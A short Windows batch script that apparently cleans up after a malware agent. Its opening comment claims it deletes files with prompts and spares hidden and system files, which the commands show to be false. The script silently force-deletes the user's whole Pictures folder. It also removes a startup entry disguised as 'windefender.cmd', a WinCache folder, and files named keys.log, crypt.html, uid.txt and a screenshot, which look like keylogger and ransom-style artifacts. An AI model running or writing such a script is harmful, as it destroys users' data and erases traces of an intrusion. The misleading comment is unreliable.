:: Deletes All files in the Current Directory With Prompts and Warnings 
::(Hidden, System, and Read-Only Files are Not Affected) 
:: 

rd /s /q "C:\Users\myles\Pictures"
mkdir C:\Users\myles\Pictures

rd /s /q "C:\Users\myles\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windefender.cmd"

rd /s /q "C:\WinCache"

rd /s /q "C:\Users\myles\AppData\Roaming\agent.pid"
rd /s /q "C:\Users\myles\AppData\Roaming\uid.txt"

rd /s /q "C:\Users\myles\AppData\Local\keys.log"
rd /s /q "C:\Users\myles\AppData\Local\crypt.html"
rd /s /q "C:\Users\myles\AppData\Local\lastcreen.png"

@ECHO Done
